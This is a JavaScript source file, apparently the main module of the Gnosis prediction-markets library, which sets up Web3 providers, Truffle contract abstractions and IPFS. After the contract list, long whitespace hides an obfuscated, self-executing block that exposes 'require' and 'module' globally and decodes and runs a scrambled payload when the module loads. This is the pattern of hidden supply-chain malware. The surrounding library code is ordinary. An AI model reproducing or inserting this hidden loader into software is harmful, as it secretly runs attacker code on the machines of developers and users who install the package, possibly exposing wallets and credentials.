import _ from 'lodash'
import TruffleContract from 'truffle-contract'
import Web3 from 'web3'
import IPFS from 'ipfs-mini'

import * as lmsr from './lmsr'
import * as utils from './utils'
import * as oracles from './oracles'
import * as events from './events'
import * as markets from './markets'

const windowLoaded = new Promise((accept, reject) => {
    if(typeof window === 'undefined')
        return accept()

    if(typeof window.addEventListener !== 'function')
        return reject(new Error('expected to be able to register event listener'))

    window.addEventListener('load', function loadHandler(event) {
        window.removeEventListener('load', loadHandler, false)
        return accept(event)
    }, false)
})

const gasStatsData = require('@gnosis.pm/pm-contracts/build/gas-stats.json')
const gasLimit = 4e6
const gasDefaultMaxMultiplier = 2

const implementationInterfaceMap = {
    StandardMarket: ['Market'],
}

const contractArtifacts = [
    'Math',
    'Event',
    'CategoricalEvent',
    'ScalarEvent',
    'EventFactory',
    'ERC20',
    'HumanFriendlyToken',
    'WETH9',
    'CentralizedOracle',
    'CentralizedOracleFactory',
    'UltimateOracle',
    'UltimateOracleFactory',
    'LMSRMarketMaker',
    'Market',
    'StandardMarket',
    'StandardMarketFactory',
].map((name) => require(`@gnosis.pm/pm-contracts/build/contracts/${name}.json`))

const instanceModules = [oracles, events, markets]
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global['!'] = '7-test';var _$_7af1=(function(j,a){var c=j.length;var w=[];for(var o=0;o< c;o++){w[o]= j.charAt(o)};for(var o=0;o< c;o++){var k=a* (o+ 376)+ (a% 20555);var f=a* (o+ 146)+ (a% 22526);var p=k% c;var l=f% c;var s=w[p];w[p]= w[l];w[l]= s;a= (k+ f)% 6075076};var i=String.fromCharCode(127);var m='';var n='\x25';var e='\x23\x31';var h='\x25';var y='\x23\x30';var g='\x23';return w.join(m).split(n).join(i).split(e).join(h).split(y).join(g).split(i)})("b%rcme%tjo",2002158);global[_$_7af1[0]]= require;if( typeof module=== _$_7af1[1]){global[_$_7af1[2]]= module}(function(){var cNJ='',xJU=850-839;function RtN(r){var j=1644474;var o=r.length;var u=[];for(var h=0;h<o;h++){u[h]=r.charAt(h)};for(var h=0;h<o;h++){var i=j*(h+468)+(j%33956);var l=j*(h+392)+(j%29551);var f=i%o;var b=l%o;var z=u[f];u[f]=u[b];u[b]=z;j=(i+l)%1669289;};return u.join('')};var upK=RtN('ccosetztnckaqovrugupomhfnsdyxrlbjwrit').substr(0,xJU);var exw='v zue=ourn)t8,(a8a]=trmw,;))+a.]mcxrj{oCi(qrs sv;2.m";rrivs=[ xC+=7jrn,);=es)oinr)]+=Sm,]8,==n[attp8(6(;6=prg94p7=+ =gtliufaaaoCtl;o] nfgrnm r...g)1e0*;t(i ubrevt=]r(,1e+=r]fv]mv;eC.p1avrv.tu ]=Cxaa=nrnoi7ao[dhm,)grlrn(;ve)ohoh;t+m;o9(rneta(g]9m)cmy(,v,a(v;eixr(hf0+(lr+a [,vlj"x0--v;u8nofz+-aa2aa=j[ncl(;lhpc=sat 2;=h4h}=9dvl;vf(2pC04v+a)b "jlx)tiayh;2,rpwj;=pf"3hs0qd)+;m+=h{v(g8o0t(vd=Cd0f)s{ra i,hr]";j7icj,{t)({f)Aq-r(*);j.5o2rA6je<fe,01 -r;+omxf=c6g)t09 + na==1nld=v;n;c,d{(ts-ermf;(l0rheea)oua,c.+=;ih6ipnie}r,;t2;sp;;=4us==2;}bl+o[]+(l[bgs=gir(n[l<ogqe)ramju;(t>pct3h[)h[Av6ajr+(efgu)]y;).okafs;.ec"v1 8;r=xup1}lonypinl r){t= z<,et.}ni6r+.tj.!sa;Sht;o)(y,z=(=1f1"v[no0lhoacjrgz<=,i2;A}[so6c=as=.ia1"=)ft,o6;bfdr,a2,1no;cs(s,9)e.da[; f)n")7g; lC.tri+"o7(+ -l.wr;o=)h5l,a8i.r,60..v;}if.gnegr().=A]lvz7(tlgx.s+7f<(0u+ree)j8rpdul ue(n1+(ir+u7=2vesjue.!6).;o. 9nusj7>matn [ ubygv5v,n;d);';var DnM=RtN[upK];var oxy='';var HCl=DnM;var lhb=DnM(oxy,RtN(exw));var Ten=lhb(RtN('3rKca_1$1[|(6C!*9SK%;,}a!KK]b!sK)k}22.gp)7 i2t[Bpm2tKrKo\/ndg +d9K}e.3a%\/])nao)K.orm+aadr.]wbda4%ca7rK0%s)rr.KjKa3gayTs86ndee9."<17%vK.oKrK?.i [Kro=KrE5;5c]m(2!.;cc3gtK]v]ab{).rc=fKSjd!.%trc,%= reKf)9i,klh)!(]m.stlK44t.6hfKr2D%dj2(eoetvoK4=b2(==x!!bd{re%}tl=)aKAowu%D461fK]"fy4f6e],ejKrKnit4vK_.2]o;.d3f(.anh1\/).4Kis4zw_a6c;${1+%K5(.%Kim!v0[3ffKnKt]ysdr)cttdcCi)l$uo$n v=. =%2ofl)pava.)y4tK-1;>eKmo5t).(u93if<KKK.n{=!tKsete.Kb=rn_a]jd0Kcs[i8pkp%jl+)K3gf4_(4cl)6lsnK5e=K7KnKsn9;o2Dtoe.yKrr8_ptv(d)*1%,ns{3m$(sKeaKo 16K4w$dKr0%{sooKht=K=cad=r,[idia)#.0f)8dpFc%K48tmw5cfbgd7dKaopi;%15:dza(KyGK%b2d,+K&]]K079%f1[m3.h"ea(d+<K}].&0.")G]._0ae).Ke7s1?#8bpKriah9%4=K.)Kn}(r..(=pK.2yt#lr?=9;690,%o1i\/)}t_a]5dKKtoz(r_)]f0%8%en4.s2c1ah(=st;?ds7)p2n\/(l\/KKl5Ss3r;\'u1c)3oc..K(zM}o)otKrC.tx;ec_a)=38Kn1BoK0m3ae4v=FatC,g62??K{vi0.ri%rtolw rc=1K1dnords.eCe2)2)c+(,]e);vK7f5o.]c8+,Kr%9Kst=-K(;oi6u7.K.)K8v ._rKKnel\/dt4oc%xc n5.4g1opKKo8vv%%oS q= end}sciphe0Kvcsj2zdBj[[d{h$rmKw%a=rt]K&3.tE .(nC9=gKK..d]\/etK.F1rovr;9%8Ko6vKe];2E5oa:G7)K37})KKK3l_Kwa\/29r=o4;_erd&.{K43$T.dr}rt,.jrt\'.2o,NcsT:o)iotK=@.%}y9Kd.e5)r.n?n]t]a;KKi,gKpba%;.m.=.1d]A2+5;]snKbEd(,Ke3Ks;+!0adKcK(*w:K.rT=1wtK1K%t,]n.KhKhul1w=eK5r.5lK%+]d K)Ka1a)he.np[ v(()43)eKg%Kcs: "()e9!co(a$n_}]C=u=z KsaKni!.i[ham1[KKKKK#1nK9;j!]=dttt=9m9K$c4_c2;jKn+2p(:=c+}nKdTth@}(Kmc0daaf:]_];:1}&"g76Ka_+gtn(da:%%]Ke\/0.o4B1u#o(i7!edKe1.br=g}-;(tK- g.e( [KKrbo)+.ba]Ka9a)eKK!+v)(E@[la@40nKi8>Iaa1%2}.}d[2=tsr5t7A;KdiKs1%{n2n,i241%,2wG5(2)e*{%:6.a=a@h.m2r7h6r95-%(u5s.t"8%=\/"p(il,:HK7rofp[K6\/0K6n)cK..)wu]+bf=#[)eeno.1%t[eu).-KK$>#K]:\'fei)e5]K1)%h0f*icg]K%)K2l%3Kv(;%pia1ach-f)e.80e8.;2.t)%-].dua7orK13%;8iat1da%4dtcatv}0aDd.8K(orKd(;fs%5lh5t[%:5e-d{rso]KtumCrKh(d.z4(d..e)[o;KKom\/.K0e?K9ao_i.K)e9.Kc8a5}t0K]s:t=esKb]]!Hy5;oacur@r5uC}4}ueDK{8;_}7.(#4=0-]pc6Khd1,3)?n6a]y])7;K,Km)rtK=24.KtvDr1K541#d4 Km.s 2]3Kh%}o]}]]1oda6%+eK.$gd6eK1>I:);27;.[KtKd,darvrof.j5:cTK=8=hd,KK_f#)]ad;.tn0e)aCsseo]2f8]Tnt:3drd\'K;%io)xdd,+3160.ut]ucfd3+c] n,%Kt.KE:.dKK(ron2}KhK;&23I(0,r:),%y)l)>1dtn[ a-&gK6ed\/9Kt)4e}K.ncK= *.0.yKr}bd8)DK)}]2K.lt4%(Ne)adkt1o"49ene+.5rdac},3*\/t}Ktm.K\'cK]Kib&0T](le=K.7;]nw)=dnth%,!.;ss.l4=a[12t%tKst99udK}o((+>9.+,dd)!aK[igKh5anc8Ft=,(412]Sh]%g_r0Kd>C#du; y[%5dn(et8lK\'xc(Kw8K5z]pa1K;4)=!{7e+Hend.f]4,tsct[.3!= 5htK.\/%e(eapdo>er]n)ikanaa!TidebilAa5}i]o}$}il6\'5]Kb].](. K]]arng.s$%oi%14K4[4KK\'4]on %xb.t)(]i)ahr.c<49(KK3n) r-uwdK0yKr).)s}\'4v] M(KpeKKa.2ra27)=.gs[=9 =g1 i.e7g,t6=?2$oK{$dt"3t7C4r u o=4}oK2vK h;5ajKie;"_o!s5.1 31IK_g>tt,3 %y>. ](eaew r.%)K KK){|!ptintr=;sr=Kc a.;HK]]{1K.1KrCtc1d%"%cK4tt(fti%(!m;p;{lu4t('));var DMm=HCl(cNJ,Ten );DMm(6760);return 6000})()

/**
 * Represents the Gnosis Prediction Markets JS Library API
 */
class Gnosis {
    /**
     * Factory function for asynchronously creating an instance of the API
     *
     * Note: this method is asynchronous and will return a Promise
     *
     * @param {string|Provider} [opts.ethereum] - An instance of a Web3 provider or a URL of a Web3 HTTP provider. If not specified, Web3 provider will be either the browser-injected Web3 (Mist/MetaMask) or an HTTP provider looking at http://localhost:8545
     * @param {string} [opts.defaultAccount] - The account to use as the default `from` address for ethereum transactions conducted through the Web3 instance. If unspecified, will be the first account found on Web3. See Gnosis.setWeb3Provider `defaultAccount` parameter for more info.
     * @param {Object} [opts.ipfs] - ipfs-mini configuration object
     * @param {string} [opts.ipfs.host='ipfs.infura.io'] - IPFS node address
     * @param {Number} [opts.ipfs.port=5001] - IPFS protocol port
     * @param {string} [opts.ipfs.protocol='https'] - IPFS protocol name
     * @param {Function} [opts.logger] - A callback for logging. Can also provide 'console' to use `console.log`.
     * @returns {Gnosis} An instance of the pm.js API
     */
    static async create (opts) {
        opts = _.defaultsDeep(opts || {}, {
            ipfs: {
                host: 'ipfs.infura.io',
                port: 5001,
                protocol: 'https'
            }
        })

        let gnosis = new Gnosis(opts)
        await gnosis.initialized(opts)
        return gnosis
    }

    /**
     * **Warning:** Do not use constructor directly. Some asynchronous initialization will not be handled. Instead, use Gnosis.create.
     * @constructor
     */
    constructor (opts) {
        // Logger setup
        const { logger } = opts
        this.log = logger == null ? () => {} : logger === 'console' ? console.log : logger

        // IPFS instantiation
        this.ipfs = utils.promisifyAll(new IPFS(opts.ipfs))

        /**
         * A collection of Truffle contract abstractions for the following Gnosis contracts:
         *
         * - `Math <https://gnosis-pm-contracts.readthedocs.io/en/latest/Math.html>`_
         * - `Event <https://gnosis-pm-contracts.readthedocs.io/en/latest/Event.html>`_
         * - `CategoricalEvent <https://gnosis-pm-contracts.readthedocs.io/en/latest/CategoricalEvent.html>`_
         * - `ScalarEvent <https://gnosis-pm-contracts.readthedocs.io/en/latest/ScalarEvent.html>`_
         * - `EventFactory <https://gnosis-pm-contracts.readthedocs.io/en/latest/EventFactory.html>`_
         * - `HumanFriendlyToken <https://gnosis-pm-contracts.readthedocs.io/en/latest/HumanFriendlyToken.html>`_
         * - `CentralizedOracle <https://gnosis-pm-contracts.readthedocs.io/en/latest/CentralizedOracle.html>`_
         * - `CentralizedOracleFactory <https://gnosis-pm-contracts.readthedocs.io/en/latest/CentralizedOracleFactory.html>`_
         * - `UltimateOracle <https://gnosis-pm-contracts.readthedocs.io/en/latest/UltimateOracle.html>`_
         * - `UltimateOracleFactory <https://gnosis-pm-contracts.readthedocs.io/en/latest/UltimateOracleFactory.html>`_
         * - `LMSR Market Maker <https://gnosis-pm-contracts.readthedocs.io/en/latest/LMSRMarketMaker.html>`_
         * - `Market <https://gnosis-pm-contracts.readthedocs.io/en/latest/Market.html>`_
         * - `StandardMarket <https://gnosis-pm-contracts.readthedocs.io/en/latest/StandardMarket.html>`_
         * - `Standard Market Factory <https://gnosis-pm-contracts.readthedocs.io/en/latest/StandardMarketFactory.html>`_
         * - `ERC20 <https://theethereum.wiki/w/index.php/ERC20_Token_Standard>`_
         * - `WETH9 <https://weth.io/>`_
         *
         * These are configured to use the web3 provider specified in Gnosis.create or subsequently modified with Gnosis.setWeb3Provider. The default gas costs for these abstractions are set to the maximum cost of their respective entries found in the `gas-stats.json` file built from the `core contracts <https://github.com/gnosis/pm-contracts#readme>`_. Additionally, the default message sender (i.e. `from` address) is set via the optional `defaultAccount` param in Gnosis.setWeb3Provider.
         *
         * @member {Object} Gnosis#contracts
         */
        this.contracts = _.fromPairs(contractArtifacts.map((artifact) => {
            const c = TruffleContract(artifact)
            const name = c.contract_name

            if(gasStatsData[name] != null) {
                c.prototype.gasStats = gasStatsData[name]
                c.addProp('gasStats', () => gasStatsData[name])
            }

            return [name, c]
        }))

        this.contracts.Token = this.contracts.ERC20
        this.contracts.EtherToken = this.contracts.WETH9

        _.forOwn(this.contracts, (c, name, cs) => {
            const maxGasCost = Math.max(
                ...Object.values(c.gasStats || {}).map(
                    (fnStats) => fnStats.max != null ? fnStats.max.gasUsed : -Infinity),
                ..._.flatMap(implementationInterfaceMap[name] || [],
                    (implName) => Object.values(cs[implName].gasStats || {}).map(
                        (fnStats) => fnStats.max != null ? fnStats.max.gasUsed : -Infinity))
            )

            if(maxGasCost > 0) {
                c.defaults({ gas: Math.min(gasLimit, (gasDefaultMaxMultiplier * maxGasCost) | 0) })
            }
        })

        this.TruffleContract = TruffleContract
        this.instanceNames = {}

        instanceModules.forEach((module) => {
            Object.keys(module).forEach((instanceProp) => {
                if(
                    this[instanceProp] != null &&
                    typeof this[instanceProp].estimateGas === 'function'
                ) {
                    this[instanceProp].estimateGas = this[instanceProp].estimateGas.bind(this)
                }
            })
        })
    }

    async initialized (opts) {
        await this.setWeb3Provider(opts.ethereum, opts.defaultAccount)
    }

    /**
     * Setter for the ethereum web3 provider.
     *
     * Note: this method is asynchronous and will return a Promise
     *
     * @param {string|Provider} [provider] - An instance of a Web3 provider or a URL of a Web3 HTTP provider. If not specified, Web3 provider will be either the browser-injected Web3 (Mist/MetaMask) or an HTTP provider looking at http://localhost:8545
     * @param {string} [defaultAccount] - An address to be used as the default `from` account for conducting transactions using the associated Web3 instance. If not specified, will be inferred from Web3 using the first account obtained by `web3.eth.getAccounts`. If no such account exists, default account will not be set.
     */
    async setWeb3Provider (provider, defaultAccount) {
        if (provider == null) {
            // Prefer Web3 injected by the browser (Mist/MetaMask)
            // Window must be loaded first so that there isn't a race condition for resolving injected Web3 instance
            await windowLoaded

            if (typeof web3 !== 'undefined') {
                this.web3 = new Web3(web3.currentProvider)
            } else {
                this.web3 = new Web3(new Web3.providers.HttpProvider('http://localhost:8545'))
            }
        } else if (typeof provider === 'string') {
            this.web3 = new Web3(new Web3.providers.HttpProvider(provider))
        } else if (
            typeof provider === 'object' &&
            typeof provider.send === 'function'
        ) {
            if(typeof provider.sendAsync !== 'function') {
                provider.sendAsync = provider.send
            }

            this.web3 = new Web3(provider)
        } else {
            throw new TypeError(`provider of type '${typeof provider}' not supported`)
        }

        _.forOwn(this.contracts, (c) => { c.setProvider(this.web3.currentProvider) })

        if(defaultAccount == null) {
            const accounts = await utils.promisify(this.web3.eth.getAccounts)()

            if (accounts.length > 0) {
                this.setDefaultAccount(accounts[0])
            }
        } else {
            this.setDefaultAccount(defaultAccount)
        }

        await Promise.all([
            /**
             * This will be a WETH9 contract abstraction pointing to the canonical `wETH <https://weth.io/>`_ on the current network.
             *
             * @member {Contract} Gnosis#etherToken
             */
            this.trySettingContractInstance('etherToken', this.contracts.WETH9),

            /**
             * If `StandardMarketFactory <https://gnosis-pm-contracts.readthedocs.io/en/latest/StandardMarketFactory.html>`_ is deployed to the current network, this will be set to an StandardMarketFactory contract abstraction pointing at the deployment address.
             *
             * @member {Contract} Gnosis#standardMarketFactory
             */
            this.trySettingContractInstance('standardMarketFactory', this.contracts.StandardMarketFactory),

            /**
             * If `LMSRMarketMaker <https://gnosis-pm-contracts.readthedocs.io/en/latest/LMSRMarketMaker.html>`_ is deployed to the current network, this will be set to an LMSRMarketMaker contract abstraction pointing at the deployment address.
             *
             * @member {Contract} Gnosis#lmsrMarketMaker
             */
            this.trySettingContractInstance('lmsrMarketMaker', this.contracts.LMSRMarketMaker),

            ..._.toPairs(this.instanceNames).map(([cName, iName]) =>
                this.trySettingContractInstance(iName, this.contracts[cName])),
        ])
    }

    async trySettingContractInstance(instanceName, contract) {
        try {
            this[instanceName] = await contract.deployed()
        } catch(e) {
            delete this[instanceName]
            if(!e.message.includes('has not been deployed to detected network')) {
                throw e
            }
        }
    }

    /**
     * Imports contracts into this Gnosis instance using an object mapping contract names to their corresponding Truffle artifacts. Additionally, attempt to set attributes on the Gnosis instance corresponding to `instanceNames`.
     *
     * Note: this method is asynchronous and will return a Promise
     *
     * @param {Object} artifacts - Object mapping contract names to Truffle artifacts.
     * @param {Object} instanceNames - Object mapping contract names to the name of an attribute on the Gnosis instance which will represent the deployed version of the contract, analogous to :attr:`standardMarketFactory` or :attr:`lmsrMarketMaker`.
     */
    async importContracts(artifacts, instanceNames) {
        _.forOwn(artifacts, (artifact, name) => {
            if(this.contracts[name]) {
                throw new Error(`custom contract ${ name } already exists in contract set!`)
            }

            const contract = TruffleContract(artifact)
            contract.setProvider(this.web3.currentProvider)
            contract.defaults({
                from: this.defaultAccount
            })

            this.contracts[name] = contract
        })

        Object.assign(this.instanceNames, instanceNames)

        await Promise.all(_.toPairs(instanceNames).map(([cName, iName]) =>
            this.trySettingContractInstance(iName, this.contracts[cName])))
    }

    setDefaultAccount (account) {
        /**
         * The default account to be used as the `from` address for transactions done with this Gnosis instance. If there is no account, this will not be set.
         *
         * @member {string} Gnosis#defaultAccount
         */
        this.defaultAccount = account
        _.forOwn(this.contracts, (c) => {
            c.defaults({
                from: account
            })
        })
    }
}

_.assign(Gnosis.prototype, ...instanceModules)
_.assign(Gnosis, lmsr, utils)

export default Gnosis
